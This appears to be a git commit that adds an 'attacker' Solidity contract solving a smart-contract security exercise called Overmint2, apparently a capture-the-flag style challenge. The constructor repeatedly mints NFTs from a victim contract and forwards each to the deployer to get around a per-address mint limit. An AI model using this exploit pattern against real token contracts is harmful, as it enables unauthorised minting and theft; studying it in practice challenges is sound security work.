e0a813266eaf8774009cc36ec339428b2c20c892
hazem-dh <hazemdhaou.it@gmail.com>
2025-07-09 00:41:34 +0200

    solved overminter2

---
+++ contracts/Attacker/Overmint2Attacker.sol
@@ -0,0 +1,26 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.15;
+
+import "../Overmint1.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract Overmint2Attacker is IERC721Receiver {
+    Overmint1 public victimContract;
+    uint recursionCount = 0;
+    constructor(address _victimContract) {
+        victimContract = Overmint1(_victimContract);
+        for (uint i = 1; i < 6; i++) {
+            victimContract.mint();
+            victimContract.safeTransferFrom(address(this), msg.sender, i);
+        }
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
